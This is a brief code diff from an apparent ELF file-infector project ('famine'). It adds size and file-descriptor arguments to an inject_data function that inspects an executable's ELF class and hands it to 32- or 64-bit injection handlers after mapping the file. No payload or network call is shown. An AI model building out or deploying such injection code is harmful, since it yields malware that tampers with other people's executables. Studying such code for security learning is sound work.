@@ -1,11 +1,11 @@
 #include "famine.h"
 
-int inject_data(unsigned char *file) {
+int inject_data(unsigned char *file, size_t size_file, int fd) {
     int archi = file[4];
     if (archi == 1)
         handle_32(file);
     else if (archi == 2)
-        handle_64(file);
+        handle_64(file, size_file, fd);
     else
         return -1;
     return 0;
@@ -33,7 +33,7 @@ int open_file_exec(char *name_file) {
         return -1;
     }
 
-    inject_data(file);
+    inject_data(file, file_size, fd);
     munmap(file, file_size);
     close(fd);
     return 0;
